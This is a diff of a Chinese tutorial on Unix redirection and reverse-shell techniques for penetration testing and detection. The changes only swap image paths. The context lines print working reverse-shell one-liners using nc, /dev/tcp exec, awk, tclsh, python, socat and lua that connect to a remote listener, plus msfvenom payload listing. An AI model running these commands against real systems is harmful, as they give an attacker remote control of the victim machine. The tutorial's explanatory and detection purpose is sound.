@@ -26,7 +26,7 @@
 1. 标准输入： standard input 0 （默认设备键盘）&#x20;
 2. 标准输出： standard output 1 （默认设备显示器）
 
-![错误输出： error o——utput 2（默认设备显示器）   ](<../../.gitbook/assets/image (462).png>)
+![错误输出： error o——utput 2（默认设备显示器）   ](<../../.gitbook/assets/image (793).png>)
 
 * 以后再打开文件，描述符可以依次增加
 * 一条 shell 命令，都会继承其父进程的文件描述符，因此所有的 shell 命令，都会默认有三个文件描述符 。
@@ -52,21 +52,21 @@
 
 说明：将文件描述符 n  重定向到 word  指代的文件（以只读方式打开） , 如果 n 省略就是 0 （标准输入）
 
-![](<../../.gitbook/assets/image (465).png>)
+![](<../../.gitbook/assets/image (506).png>)
 
 解释 : 解析器解析到 "<" 以后会先处理重定向，将标准输入重定向到 file ，之后 cat 再从标准输入读取指令的时候，由于标准输入已经重定向到了 file ，于是 cat 就从 file 中读取指令了。 (有没有觉得这 个其实就是 C 语言中的指针或者文件句柄，就是将 0 这个指针指向了不同的地址，自然有不同的输入)
 
-![图示](<../../.gitbook/assets/image (470).png>)
+![图示](<../../.gitbook/assets/image (271).png>)
 
 2、输出重定向
 
 格式： `[n]> word`
 
-![](<../../.gitbook/assets/image (463).png>)
+![](<../../.gitbook/assets/image (409).png>)
 
 说明：将文件描述符 n 重定向到 word 指代的文件（以写的方式打开），如果 n 省略则默认就是 1 （标准输出）
 
-![图示](<../../.gitbook/assets/image (464).png>)
+![图示](<../../.gitbook/assets/image (385).png>)
 
 3、标准输出与标准错误输出重定向
 
@@ -74,11 +74,11 @@
 
 说明 : 将标准输出与标准错误输出都定向到 word 代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 > word 2>&1 (2>&1 是将标准错误输出复制到标准输出， & 是为了区 分文件 1 和文件描述符 1 的，详细的介绍后面会有
 
-![](<../../.gitbook/assets/image (468).png>)
+![](<../../.gitbook/assets/image (363).png>)
 
 解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。
 
-![图示](<../../.gitbook/assets/image (469).png>)
+![图示](<../../.gitbook/assets/image (981).png>)
 
 4、文件描述符的复制
 
@@ -98,9 +98,9 @@ cmd 2>&1 >file
 
 与第一条指令类似的指令在上面我已经介绍过了，我们现在就来看看第二条指令的执行过程
 
-![解析器解析到 2>&1](<../../.gitbook/assets/image (467).png>)
+![解析器解析到 2>&1](<../../.gitbook/assets/image (985).png>)
 
-![解析器再向后解析到 “>”](<../../.gitbook/assets/image (461).png>)
+![解析器再向后解析到 “>”](<../../.gitbook/assets/image (767).png>)
 
 5、exec绑定重定向
 
@@ -114,7 +114,7 @@ cmd 2>&1 >file
 
 说明：以读写方式打开 word 指代的文件，并将 n 重定向到该文件。如果 n 不指定的话，默认为标准输入
 
-![](<../../.gitbook/assets/image (460).png>)
+![](<../../.gitbook/assets/image (1065).png>)
 
 #### 3、总结
 
@@ -150,7 +150,7 @@ cmd 2>&1 >file
 
 最近做分享，越来越喜欢使用思维导图，整理思路确实是一把好手，不过下面的思维导图，反反复复修改了很多次。一开始 站的高度不够，整理出来的都是各种反弹shell命令，其实这些东西都有专门的网站收集，写了没有意义，还是理解的不够， 又改了几版，反复验证每条命令的原理和梳理检测方案，才有了下面反弹shell的整体框架
 
-![](../../.gitbook/assets/fan-dan-shell-zong-jie-zheng-li-.png)
+![](../../.gitbook/assets/反弹shell总结整理.png)
 
 ## 2、反弹姿势
 
@@ -168,11 +168,11 @@ awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/8080"; while(42) { do{ printf "shell>" |&
 echo 'set s [socket 127.0.0.1 8080];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;sete"exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; };close $s;' | tclsh
 ```
 
-![](<../../.gitbook/assets/image (437).png>)
+![](<../../.gitbook/assets/image (361).png>)
 
 #### 2、网络是短连接，命令执行是常驻shell模式
 
-![](<../../.gitbook/assets/image (444).png>)
+![](<../../.gitbook/assets/image (279).png>)
 
 client向server发送请求，server将命令内容响应给client,client 获取命令内容，通过管道发送给bash执行，并读取执行结果， 最后通过请求再发给server，完成一个流程。&#x20;
 
@@ -195,7 +195,7 @@ client向server发送请求，server将命令内容响应给client,client 获取
 
 连通类非交互式反弹shell，区别于间断类，网络连接与命令输入输出构成一条连续的通道，其基本结构如下图所示：
 
-![](<../../.gitbook/assets/image (441).png>)
+![](<../../.gitbook/assets/image (603).png>)
 
 这种反弹 shell 在渗透测试中比较常见，举两个典型示例：
 
@@ -203,11 +203,11 @@ client向server发送请求，server将命令内容响应给client,client 获取
 
 在控制端运行 `nc -lvp 8080` , 在被控端运行 `nc -e /bin/sh 127.0.0.1 8080` , 在控制端运行 history 是没有任何反应的。
 
-![](<../../.gitbook/assets/image (458).png>)
+![](<../../.gitbook/assets/image (672).png>)
 
 观察一下被控端反弹的 bash ，它的输入输出都连接着管道，同时其他句柄绑定有网络连接。
 
-![](<../../.gitbook/assets/image (457).png>)
+![](<../../.gitbook/assets/image (340).png>)
 
 2、EXEC反弹
 
@@ -219,7 +219,7 @@ exec /bin/sh 0</dev/tcp/127.0.0.1/8080 1>&0 2>&0
 
 连通状态和 nc 反弹是类似的， sh 的输入输出句柄都有网络连接 , 从而保证了网络与命令之间的实时连通
 
-![](<../../.gitbook/assets/image (459).png>)
+![](<../../.gitbook/assets/image (628).png>)
 
 当然为了保证网络与命令之间的实时连通 也不一定全是这种情况，大家可以了解一下 select ， epoll 机制
 
@@ -236,15 +236,15 @@ exec /bin/sh 0</dev/tcp/127.0.0.1/8080 1>&0 2>&0
 
 在上一节的基础上，控制端运行 bash -i , 我们看到受控端机器上的当前路径被映射到了本地
 
-![](<../../.gitbook/assets/image (446).png>)
+![](<../../.gitbook/assets/image (338).png>)
 
 接着运行 history 命令，为了方面截图，使用 grep 进行了过滤
 
-![](<../../.gitbook/assets/image (452).png>)
+![](<../../.gitbook/assets/image (268).png>)
 
 最后运行 top, 报了 `top: failed tty get` 这个错误，无法获取一个终端，这也是我将它定义为半交互式的原因
 
-![](<../../.gitbook/assets/image (447).png>)
+![](<../../.gitbook/assets/image (976).png>)
 
 2、直接反弹 bash -i
 
@@ -270,11 +270,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 在控制端输入 top 命令，看看是否有动态输出：
 
-![](<../../.gitbook/assets/image (449).png>)
+![](<../../.gitbook/assets/image (911).png>)
 
 接着查看反弹 bash 的输入输出上是否有管道或者 socket 绑定，我们发现 pty 反弹 bash 的输入输出和正常一样，这也是和 nc 反弹 不同的点
 
-![](<../../.gitbook/assets/image (454).png>)
+![](<../../.gitbook/assets/image (810).png>)
 
 #### 2、普通反弹 shell 中生成 pty
 
@@ -284,7 +284,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![](<../../.gitbook/assets/image (451).png>)
+![](<../../.gitbook/assets/image (345).png>)
 
 假如系统中没有 python 环境，比如 docker 容器中，那么使用 script 命令也是可以
 
@@ -308,7 +308,7 @@ socat tcp-connect:127.0.0.1:8080 exec:"bash -li",pty,stderr,setsid,sigint,sane
 
 在 socat 反弹 shell 里，使用 tab 补齐 whoami 命令，感觉和正常终端没有什么区别
 
-![](<../../.gitbook/assets/image (448).png>)
+![](<../../.gitbook/assets/image (386).png>)
 
 在渗透测试中，如果想更好的使用 socat ，大家可以使用下面的脚本生成静态编译的 socat
 
@@ -339,7 +339,7 @@ stty -a
 nc -lvp 8080
 ```
 
-![](<../../.gitbook/assets/image (453).png>)
+![](<../../.gitbook/assets/image (79).png>)
 
 在被控端，只需要使用一个普通的反弹 shell 连接到控制端即可，剩下的工作在控制端做就可以了
 
@@ -383,7 +383,7 @@ stty rows 42 columns 162
 
 最后的效果如下，继续使用 tab 补全 whoami 命令
 
-![](<../../.gitbook/assets/image (450).png>)
+![](<../../.gitbook/assets/image (1083).png>)
 
 最后推荐一个收集反弹 shell 的网站： https://krober.biz/misc/reverse\_shell.php?ip=127.0.0.1\&port=8888 ，里面常见的反弹 shell 都可以看到
 
@@ -431,7 +431,7 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','123
 msfvenom -l payloads 'cmd/unix/reverse'
 ```
 
-![](<../../.gitbook/assets/image (455).png>)
+![](<../../.gitbook/assets/image (277).png>)
 
 查看以上截图，我们可以看到 msfvenom 支持生成反弹 shell 一句话的类型非常丰富，这里几乎是应有尽有，大家可以依据渗透测试对象自行选择使用
 
